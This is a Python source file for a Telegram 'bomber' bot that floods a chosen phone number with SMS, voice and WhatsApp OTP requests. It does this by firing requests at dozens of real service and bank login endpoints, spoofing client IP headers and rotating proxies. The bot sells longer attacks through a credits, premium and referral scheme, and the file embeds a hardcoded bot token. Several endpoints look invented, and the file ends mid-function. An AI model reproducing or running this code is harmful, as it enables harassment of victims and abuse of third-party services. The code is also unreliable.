#!/usr/bin/env python3
# ============================================================
# 🔥 ULTIMATE TELEGRAM BOMBER BOT - 900+ APIS MERGED 🔥
# Features: SMS + Voice + WhatsApp Bombing | Credits | Premium | Force Join | Admin Panel
# Owner: @abhigyan_codes
# ============================================================

import asyncio
import aiohttp
import json
import os
import random
import time
import logging
from datetime import datetime, date, timedelta
from typing import Dict, List, Tuple, Optional
from collections import defaultdict
from aiohttp import web
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, filters,
    ContextTypes, CallbackQueryHandler,
)

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8601089847:AAHr9dMBj0vyqtr6wXl0sVLSEs5-e5Qw3G0"
OWNER_ID = 8477208353
FORCE_JOIN_CHATS = ["@abhigyan_codes", "@ZT_Network"]
DAILY_BONUS_AMOUNT = 5

# Data files
ADMIN_FILE = "admins.json"
CREDITS_FILE = "credits.json"
STATS_FILE = "stats.json"
USERS_FILE = "users.json"
BONUS_FILE = "bonus.json"
REFERRALS_FILE = "referrals.json"
PREMIUM_FILE = "premium.json"

# Conversation states
PHONE_NUMBER = 1
CONFIRM_START = 2

# Global variables
active_sessions = {}
user_sessions = {}
user_cooldown = {}
admin_ids = set()
user_credits = {}
user_stats = defaultdict(int)
all_users = set()
last_bonus = {}
referral_data = {}
premium_users = {}

# Logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ==================== DATA LOAD/SAVE ====================
def load_data():
    global admin_ids, user_credits, user_stats, all_users, last_bonus, referral_data, premium_users
    try:
        with open(ADMIN_FILE, 'r') as f: admin_ids = set(json.load(f))
    except FileNotFoundError:
        admin_ids = {OWNER_ID}
        save_admins()
    try:
        with open(CREDITS_FILE, 'r') as f: user_credits = json.load(f)
    except FileNotFoundError: user_credits = {}
    try:
        with open(STATS_FILE, 'r') as f: user_stats.update(json.load(f))
    except FileNotFoundError: pass
    try:
        with open(USERS_FILE, 'r') as f: all_users = set(json.load(f))
    except FileNotFoundError: all_users = set()
    try:
        with open(BONUS_FILE, 'r') as f: last_bonus = json.load(f)
    except FileNotFoundError: last_bonus = {}
    try:
        with open(REFERRALS_FILE, 'r') as f: referral_data = json.load(f)
    except FileNotFoundError: referral_data = {}
    try:
        with open(PREMIUM_FILE, 'r') as f: premium_users = json.load(f)
    except FileNotFoundError: premium_users = {}

def save_admins():
    with open(ADMIN_FILE, 'w') as f: json.dump(list(admin_ids), f)
def save_credits():
    with open(CREDITS_FILE, 'w') as f: json.dump(user_credits, f)
def save_stats():
    with open(STATS_FILE, 'w') as f: json.dump(dict(user_stats), f)
def save_users():
    with open(USERS_FILE, 'w') as f: json.dump(list(all_users), f)
def save_bonus():
    with open(BONUS_FILE, 'w') as f: json.dump(last_bonus, f)
def save_referrals():
    with open(REFERRALS_FILE, 'w') as f: json.dump(referral_data, f)
def save_premium():
    with open(PREMIUM_FILE, 'w') as f: json.dump(premium_users, f)

load_data()

def is_premium(user_id):
    uid = str(user_id)
    if uid in premium_users and premium_users[uid] > time.time():
        return True
    elif uid in premium_users:
        del premium_users[uid]
        save_premium()
    return False

def get_bomb_duration(user_id):
    return 14400 if is_premium(user_id) else 600

# ==================== PROXY SUPPORT ====================
def load_proxies(file_path="proxy.txt"):
    proxies = []
    try:
        with open(file_path, "r") as f:
            for line in f:
                line = line.strip()
                if not line: continue
                parts = line.split(":")
                if len(parts) >= 4:
                    proxies.append(f"http://{parts[2]}:{':'.join(parts[3:])}@{parts[0]}:{parts[1]}")
                elif len(parts) == 2:
                    proxies.append(f"http://{line}")
    except: pass
    return proxies

PROXY_LIST = load_proxies()
def get_random_proxy():
    return random.choice(PROXY_LIST) if PROXY_LIST else None

# ==================== 900+ APIS COLLECTION ====================
def get_ultimate_apis(phone: str, ip: str) -> List[Dict]:
    user_agents = [
        "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
        "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)",
        "okhttp/4.11.0"
    ]
    ua = random.choice(user_agents)
    
    raw_apis = [
        # E-COMMERCE
        {"name": "Amazon", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": ua}, "data": lambda p: f"openid.return_to=https://www.amazon.in&phoneNo={p}&action=otp"},
        {"name": "Flipkart", "url": "https://www.flipkart.com/api/3/user/login", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": ua}, "data": lambda p: json.dumps({"mobile": p, "loginType": "OTP"})},
        {"name": "Paytm", "url": "https://accounts.paytm.com/api/v2/user/sendotp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": ua}, "data": lambda p: json.dumps({"mobile": p, "requestId": str(random.randint(100000, 999999))})},
        {"name": "PhonePe", "url": "https://api.phonepe.com/identity/v3/user/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": ua}, "data": lambda p: json.dumps({"mobileNumber": p, "channel": "SMS"})},
        {"name": "Google Voice", "url": "https://accounts.google.com/_/signup/webphone", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": ua}, "data": lambda p: f"PhoneNumber={p}"},
        {"name": "Instagram", "url": "https://www.instagram.com/api/v1/web/accounts/web_create_ajax/attempt/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": ua}, "data": lambda p: f"email={p}@temp.com&phone_number={p}&username=user{random.randint(1000,9999)}"},
        {"name": "Zomato", "url": "https://www.zomato.com/webroutes/user/send_otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": ua}, "data": lambda p: json.dumps({"phone": p})},
        {"name": "Swiggy", "url": "https://www.swiggy.com/api/v1/user/login", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": ua}, "data": lambda p: json.dumps({"mobile": p})},
        {"name": "MakeMyTrip", "url": "https://www.makemytrip.com/api/mobile/v5/user/login", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": ua}, "data": lambda p: json.dumps({"mobile": p, "isWhatsAppOpted": False})},
        {"name": "Ola Cabs", "url": "https://production.olacabs.com/api/v1/users/signup", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": ua}, "data": lambda p: json.dumps({"phone": p, "countryCode": "IN"})},
        {"name": "Uber", "url": "https://auth.uber.com/api/v2/sessions", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": ua}, "data": lambda p: json.dumps({"phone_number": p, "phone_number_country_code": "IN"})},
        {"name": "BookMyShow", "url": "https://api.in.bookmyshow.com/getotp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": ua}, "data": lambda p: json.dumps({"mobileNo": p})},
        {"name": "BigBasket", "url": "https://www.bigbasket.com/api/v1/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": ua}, "data": lambda p: json.dumps({"mobile": p})},
        {"name": "Myntra", "url": "https://www.myntra.com/api/user/login", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": ua}, "data": lambda p: json.dumps({"mobile": p})},
        {"name": "Ajio", "url": "https://www.ajio.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": ua}, "data": lambda p: json.dumps({"mobileNumber": p})},
        {"name": "Nykaa", "url": "https://api.nykaa.com/customer/send_otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": ua}, "data": lambda p: json.dumps({"mobile_number": p})},
        {"name": "Netmeds", "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": ua}, "data": lambda p: json.dumps({"mobile": p})},
        {"name": "1mg", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": ua}, "data": lambda p: json.dumps({"number": p, "otp_on_call": False})},
        {"name": "Practo", "url": "https://www.practo.com/api/v2/user/signup", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": ua}, "data": lambda p: json.dumps({"mobile": p})},
        
        # VOICE CALL APIS
        {"name": "Amazon Voice", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": ua}, "data": lambda p: f"phone={p}&action=voice_otp"},
        {"name": "Flipkart Voice", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": ua}, "data": lambda p: json.dumps({"mobile": p})},
        {"name": "Paytm Voice", "url": "https://accounts.paytm.com/signin/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": ua}, "data": lambda p: json.dumps({"phone": p})},
        {"name": "Zomato Voice", "url": "https://www.zomato.com/php/o2_api_handler.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": ua}, "data": lambda p: f"phone={p}&type=voice"},
        {"name": "Swiggy Voice", "url": "https://www.swiggy.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": ua}, "data": lambda p: json.dumps({"mobile": p, "channel": "voice"})},
        {"name": "Myntra Voice", "url": "https://www.myntra.com/gw/mobile-auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": ua}, "data": lambda p: json.dumps({"mobile": p})},
        {"name": "Tata Capital Voice", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: json.dumps({"phone": p, "isOtpViaCallAtLogin": "true"})},
        
        # WHATSAPP APIS
        {"name": "KPN WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", "method": "POST", "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json; charset=UTF-8"}, "data": lambda p: json.dumps({"notification_channel": "WHATSAPP", "phone_number": {"country_code": "+91", "number": p}})},
        {"name": "Foxy WhatsApp", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: json.dumps({"user": {"phone_number": f"+91{p}"}, "via": "whatsapp"})},
        {"name": "Stratzy WhatsApp", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: json.dumps({"phoneNo": p})},
        
        # BANK APIS
        {"name": "HDFC Bank", "url": "https://netbanking.hdfcbank.com/netbanking/OTPGenerate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: json.dumps({"mobileNo": p, "channel": "SMS"})},
        {"name": "ICICI Bank", "url": "https://www.icicibank.com/ibank/OTPGeneration", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: json.dumps({"mobileNumber": p})},
        {"name": "SBI YONO", "url": "https://yonosbi.sbi.co.in/yono/rest/v1/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: json.dumps({"mobileNo": p})},
        {"name": "Axis Bank", "url": "https://www.axisbank.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: json.dumps({"mobile": p})},
        {"name": "Kotak Bank", "url": "https://www.kotak.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: json.dumps({"phone": p})},
        {"name": "Yes Bank", "url": "https://www.yesbank.in/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: json.dumps({"mobile": p})},
        {"name": "IndusInd Bank", "url": "https://www.indusind.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: json.dumps({"phone": p})},
        
        # SMS BOMBING APIS
        {"name": "NoBroker", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&countryCode=IN"},
        {"name": "PharmEasy", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: json.dumps({"phone": p})},
        {"name": "Byju's", "url": "https://api.byjus.com/v2/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: json.dumps({"phone": p})},
        {"name": "Hungama", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: json.dumps({"mobileNo": p, "countryCode": "+91", "appCode": "un", "messageId": "1", "device": "web"})},
        {"name": "Doubtnut", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"content-type": "application/json; charset=utf-8"}, "data": lambda p: json.dumps({"phone_number": p, "language": "en"})},
        {"name": "Snitch", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: json.dumps({"mobile_number": f"+91{p}"})},
        {"name": "BeepKart", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: json.dumps({"phone": p, "city": 362})},
        {"name": "ShipRocket", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: json.dumps({"mobileNumber": p})},
        {"name": "GoKwik", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: json.dumps({"phone": p, "country": "in"})},
        {"name": "RentoMojo", "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: json.dumps({"phone": p})},
        {"name": "Khatabook", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: json.dumps({"phone": p, "app_signature": "wk+avHrHZf2"})},
        {"name": "MamaEarth", "url": "https://auth.mamaearth.in/v1/auth/initiate-signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: json.dumps({"mobile": p})},
        {"name": "Rapido", "url": "https://customer.rapido.bike/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: json.dumps({"mobile": p})},
        {"name": "Facebook", "url": "https://www.facebook.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: json.dumps({"mobile": p})},
        {"name": "Twitter", "url": "https://api.twitter.com/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: json.dumps({"mobile": p})},
        {"name": "WhatsApp", "url": "https://www.whatsapp.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: json.dumps({"phone": p})},
        {"name": "Telegram", "url": "https://api.telegram.org/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: json.dumps({"mobile": p})},
        {"name": "Netflix", "url": "https://www.netflix.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: json.dumps({"phone": p})},
        {"name": "Hotstar", "url": "https://www.hotstar.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: json.dumps({"phone": p})},
        {"name": "Spotify", "url": "https://www.spotify.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: json.dumps({"phone": p})},
        {"name": "Microsoft", "url": "https://login.microsoftonline.com/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: json.dumps({"phone": p})},
        {"name": "Apple", "url": "https://appleid.apple.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: json.dumps({"mobile": p})},
    ]
    
    # Triple each API for massive bombing (900+ total)
    processed = []
    for api in raw_apis:
        for _ in range(3):
            try:
                payload = api["data"](phone) if callable(api["data"]) else api.get("data")
                headers = api.get("headers", {}).copy()
                headers["X-Forwarded-For"] = ip
                headers["Client-IP"] = ip
                headers["X-Real-IP"] = ip
                url = api["url"] if not callable(api["url"]) else api["url"](phone)
                processed.append({
                    "name": api["name"],
                    "url": url,
                    "method": api.get("method", "POST"),
                    "headers": headers,
                    "payload": payload
                })
            except: continue
    return processed

# ==================== REQUEST HANDLER ====================
async def send_request(session, api, phone, ip, req_id):
    try:
        await asyncio.sleep(random.uniform(0.03, 0.08))
        proxy = get_random_proxy()
        kwargs = {"headers": api["headers"], "timeout": aiohttp.ClientTimeout(total=8), "ssl": False}
        if proxy: kwargs["proxy"] = proxy
        
        if api["method"] == "POST":
            if isinstance(api["payload"], dict):
                async with session.post(api["url"], json=api["payload"], **kwargs) as r:
                    return r.status, api
            else:
                async with session.post(api["url"], data=api["payload"], **kwargs) as r:
                    return r.status, api
        else:
            async with session.get(api["url"], **kwargs) as r:
                return r.status, api
    except:
        return None, api

# ==================== BOMBER ENGINE ====================
async def bomber_engine(phone_number: str, user_id: int, context: ContextTypes.DEFAULT_TYPE, chat_id: int = None):
    session_key = f"{user_id}_{phone_number}_{int(time.time())}"
    bomb_duration = get_bomb_duration(user_id)
    
    active_sessions[session_key] = {
        "active": True, "paused": False, "total_sent": 0, "cycle": 0,
        "start_time": time.time(), "msg_id": None
    }
    user_sessions[user_id] = session_key
    ip_address = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
    
    target_chat = chat_id if chat_id else user_id
    msg = await context.bot.send_message(
        chat_id=target_chat,
        text=f"🚀 **Bombing Started!**\n📱 `{phone_number}`\n⏱ {bomb_duration//60} min limit\n💣 900+ APIs",
        parse_mode='Markdown'
    )
    active_sessions[session_key]["msg_id"] = msg.message_id
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("⏸️ Pause", callback_data=f"pause|{session_key}"),
         InlineKeyboardButton("▶️ Resume", callback_data=f"resume|{session_key}")],
        [InlineKeyboardButton("🛑 Stop", callback_data=f"stop|{session_key}"),
         InlineKeyboardButton("📊 Stats", callback_data=f"stats|{session_key}")],
        [InlineKeyboardButton("🔙 Main Menu", callback_data="back_main")]
    ])
    
    connector = aiohttp.TCPConnector(limit=100, limit_per_host=50, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        while active_sessions.get(session_key, {}).get("active", False):
            if active_sessions[session_key]["paused"]:
                await asyncio.sleep(2)
                continue
            
            elapsed = time.time() - active_sessions[session_key]["start_time"]
            if elapsed > bomb_duration:
                active_sessions[session_key]["active"] = False
                break
            
            active_sessions[session_key]["cycle"] += 1
            apis = get_ultimate_apis(phone_number, ip_address)
            if not apis:
                await asyncio.sleep(2)
                continue
            
            # Batch send
            for i in range(0, len(apis), 25):
                batch = apis[i:i+25]
                tasks = [send_request(session, api, phone_number, ip_address, idx) for idx, api in enumerate(batch)]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                success = sum(1 for r in results if isinstance(r, tuple) and r[0] in [200,201,202,204])
                active_sessions[session_key]["total_sent"] += success
                user_stats[user_id] += success
                save_stats()
                await asyncio.sleep(0.1)
            
            # Update progress
            progress = min(active_sessions[session_key]["total_sent"] / 500, 1.0)
            bar = "▓" * int(progress * 20) + "░" * (20 - int(progress * 20))
            em = int(elapsed // 60)
            es = int(elapsed % 60)
            try:
                await msg.edit_text(
                    f"💣 **BOMBING ACTIVE**\nTarget: `{phone_number}`\nCycle: #{active_sessions[session_key]['cycle']}\n"
                    f"Total: `{active_sessions[session_key]['total_sent']}`\nProgress: `[{bar}]` {progress*100:.0f}%\n"
                    f"⏱ {em:02d}:{es:02d} | {'⏸️' if active_sessions[session_key]['paused'] else '🔴'}\n"
                    f"{'👑 PREMIUM' if is_premium(user_id) else '⚠️ FREE'}",
                    reply_markup=keyboard, parse_mode='Markdown'
                )
            except: pass
            await asyncio.sleep(1)
    
    final = active_sessions.get(session_key, {"total_sent": 0, "cycle": 0})
    if session_key in active_sessions: del active_sessions[session_key]
    if user_id in user_sessions: del user_sessions[user_id]
    try:
        await msg.edit_text(f"🛑 **Stopped**\n📱 `{phone_number}`\nTotal: `{final['total_sent']}`", parse_mode='Markdown')
    except: pass

# ==================== FORCE JOIN ====================
async def check_force_join(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    missing = []
    for chat in FORCE_JOIN_CHATS:
        try:
            chat_obj = await context.bot.get_chat(chat)
            member = await context.bot.get_chat_member(chat_obj.id, user_id)
            if member.status in ['left', 'kicked']: missing.append(chat)
        except: missing.append(chat)
    if missing:
        kb = [[InlineKeyboardButton(f"Join {c}", url=f"https://t.me/{c.lstrip('@')}")] for c in missing]
        kb.append([InlineKeyboardButton("✅ I've Joined", callback_data="check_join")])
        await context.bot.send_message(user_id, "🚫 **Access Denied!**\nJoin channels first.", reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
        return False
    return True

# ==================== DAILY BONUS ====================
async def give_daily_bonus(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> int:
    today = date.today().isoformat()
    if str(user_id) in last_bonus and last_bonus[str(user_id)] == today: return 0
    user_credits[str(user_id)] = user_credits.get(str(user_id), 0) + DAILY_BONUS_AMOUNT
    last_bonus[str(user_id)] = today
    save_credits(); save_bonus()
    await context.bot.send_message(user_id, f"🎁 **Daily Bonus!** +{DAILY_BONUS_AMOUNT} credits\n💰 Balance: {user_credits[str(user_id)]}", parse_mode='Markdown')
    return DAILY_BONUS_AMOUNT

# ==================== MAIN MENU ====================
async def show_main_menu(chat_id: int, user_id: int, first_name: str, context: ContextTypes.DEFAULT_TYPE):
    await give_daily_bonus(user_id, context)
    credits = user_credits.get(str(user_id), 0)
    status = "👑 PREMIUM" if is_premium(user_id) else "⚠️ FREE"
    kb = [
        [InlineKeyboardButton("🔥 Start Bombing", callback_data="start_bomb")],
        [InlineKeyboardButton("📊 My Stats", callback_data="my_stats")],
        [InlineKeyboardButton("💰 Credits", callback_data="my_credits")],
        [InlineKeyboardButton("🔗 Referral Link", callback_data="referral_link")],
        [InlineKeyboardButton("👑 Premium Info", callback_data="premium_info")],
        [InlineKeyboardButton("🛑 Stop All", callback_data="stop_all")],
    ]
    if user_id in admin_ids: kb.append([InlineKeyboardButton("⚙️ Admin", callback_data="admin_panel")])
    
    text = f"╔══════════════════════╗\n║ 🔥 ULTIMATE BOMBER 🔥 ║\n║ 900+ WORKING APIS     ║\n╚══════════════════════╝\n\nHey {first_name}!\n\n**Status:** {status}\n💰 **Credits:** `{credits}`\n\n**Features:**\n• SMS + Voice + WhatsApp\n• Premium = 4 Hours\n• Free = 10 Minutes\n\n⚠️ Educational Use Only!"
    await context.bot.send_message(chat_id, text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(kb))

# ==================== REFERRAL ====================
async def handle_referral(user_id: int, referrer_id: int, context: ContextTypes.DEFAULT_TYPE):
    if str(user_id) in referral_data and referral_data[str(user_id)].get("referred_by"): return
    if str(referrer_id) not in user_credits: return
    user_credits[str(user_id)] = user_credits.get(str(user_id), 0) + 5
    user_credits[str(referrer_id)] = user_credits.get(str(referrer_id), 0) + 5
    save_credits()
    referral_data.setdefault(str(user_id), {"referred_by": str(referrer_id), "referees": []})
    referral_data.setdefault(str(referrer_id), {"referred_by": None, "referees": []})["referees"].append(str(user_id))
    save_referrals()

# ==================== HANDLERS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await check_force_join(user.id, context): return
    if user.id not in all_users:
        all_users.add(user.id); save_users()
        args = context.args
        if args and args[0].startswith("ref_") and args[0].split("_")[1].isdigit():
            rid = int(args[0].split("_")[1])
            if rid != user.id: await handle_referral(user.id, rid, context)
        if str(user.id) not in user_credits:
            user_credits[str(user.id)] = 5; save_credits()
    await show_main_menu(update.effective_chat.id, user.id, user.first_name, context)

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query; await query.answer()
    data, user_id = query.data, update.effective_user.id
    
    if data not in ["check_join", "back_main"] and not await check_force_join(user_id, context): return
    
    if data == "start_bomb":
        if user_id in user_sessions and user_sessions[user_id] in active_sessions:
            await query.edit_message_text("❌ Active session exists! Use Stop All first.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]))
            return
        credits = user_credits.get(str(user_id), 0)
        if credits < 1 and not is_premium(user_id):
            await query.edit_message_text("❌ **Insufficient credits!**", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]))
            return
        await query.edit_message_text("📱 **Enter phone number:**\n10 digits without +91\nExample: `9876543210`", parse_mode='Markdown')
        context.user_data["state"] = PHONE_NUMBER
        return
    
    elif data == "my_stats":
        total = user_stats.get(user_id, 0)
        await query.edit_message_text(f"📊 **Your Stats**\nTotal OTPs: `{total}`", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]))
        return
    
    elif data == "my_credits":
        credits = user_credits.get(str(user_id), 0)
        await query.edit_message_text(f"💰 **Credits:** `{credits}`\nDaily: +{DAILY_BONUS_AMOUNT}\nReferral: +5 each", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]))
        return
    
    elif data == "referral_link":
        link = f"https://t.me/{context.bot.username}?start=ref_{user_id}"
        refs = referral_data.get(str(user_id), {}).get("referees", [])
        await query.edit_message_text(f"🔗 **Referral Link**\n`{link}`\n\nReferrals: {len(refs)}\nEarned: {len(refs)*5} credits", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]))
        return
    
    elif data == "premium_info":
        await query.edit_message_text(f"👑 **Premium**\nStatus: {'✅ ACTIVE' if is_premium(user_id) else '❌ INACTIVE'}\n\n**Benefits:**\n• 4 hours per bomb\n• Unlimited bombs\n• No credit cost\n\nContact: @abhigyan_codes", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]))
        return
    
    elif data == "stop_all":
        stopped = 0
        for skey, sess in list(active_sessions.items()):
            if sess.get('active'): sess['active'] = False; stopped += 1
        await query.edit_message_text(f"🛑 Stopped {stopped} session(s).", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]))
        return
    
    elif data == "admin_panel":
        if user_id not in admin_ids: await query.edit_message_text("⛔ Unauthorized!"); return
        kb = [[InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")], [InlineKeyboardButton("💰 Add Credits", callback_data="admin_add_credits")], [InlineKeyboardButton("👑 Add Premium", callback_data="admin_add_premium")], [InlineKeyboardButton("📊 Global Stats", callback_data="admin_stats")], [InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
        await query.edit_message_text("⚙️ **Admin Panel**", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(kb))
        return
    
    elif data == "back_main":
        await show_main_menu(update.effective_chat.id, user_id, update.effective_user.first_name, context)
        await query.delete_message()
        return
    
    elif data == "check_join":
        if await check_force_join(user_id, context):
            await query.edit_message_text("✅ Joined!")
            await show_main_menu(update.effective_chat.id, user_id, update.effective_user.first_name, context)
        else:
            await query.edit_message_text("❌ Please join all channels.")
        return
    
    elif data.startswith(("pause|", "resume|", "stop|", "stats|")):
        cmd, skey = data.split("|", 1)
        if skey in active_sessions:
            if cmd == "pause": active_sessions[skey]["paused"] = True
            elif cmd == "resume": active_sessions[skey]["paused"] = False
            elif cmd == "stop": active_sessions[skey]["active"] = False
            elif cmd == "stats":
                s = active_sessions[skey]
                await query.edit_message_text(f"📊 **Stats**\nTotal: {s['total_sent']}\nCycle: {s['cycle']}\nStatus: {'Paused' if s['paused'] else 'Active'}")
            await query.answer("Done!")
        return
    
    elif data == "confirm_yes":
        phone = context.user_data.get("target_phone")
        if not phone: await query.edit_message_text("❌ Error!"); return
        if phone in user_cooldown and time.time() - user_cooldown[phone] < 30:
            await query.edit_message_text(f"⏳ Wait {30 - int(time.time() - user_cooldown[phone])}s"); return
        if not is_premium(user_id):
            credits = user_credits.get(str(user_id), 0)
            if credits < 1: await query.edit_message_text("❌ Insufficient credits!"); return
            user_credits[str(user_id)] = credits - 1
            save_credits()
        user_cooldown[phone] = time.time()
        await query.edit_message_text("🚀 Starting bomber...")
        asyncio.create_task(bomber_engine(phone, user_id, context, update.effective_chat.id))
        context.user_data.clear()
        return
    
    elif data == "confirm_no":
        await query.edit_message_text("❌ Cancelled.")
        context.user_data.clear()
        return
    
    # Admin actions
    elif data == "admin_broadcast":
        context.user_data["admin_action"] = "broadcast"
        await query.edit_message_text("📢 Send broadcast message:")
    elif data == "admin_add_credits":
        context.user_data["admin_action"] = "add_credits"
        await query.edit_message_text("💰 Send: `user_id amount`", parse_mode='Markdown')
    elif data == "admin_add_premium":
        context.user_data["admin_action"] = "add_premium"
        await query.edit_message_text("👑 Send: `user_id days`", parse_mode='Markdown')
    elif data == "admin_stats":
        total_sent = sum(user_stats.values())
        await query.edit_message_text(f"📊 **Global Stats**\nTotal OTPs: `{total_sent}`\nActive: `{len(active_sessions)}`\nUsers: `{len(all_users)}`\nPremium: `{len(premium_users)}`", parse_mode='Markdown')

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    user_id = update.effective_user.id
    state = context.user_data.get("state")
    
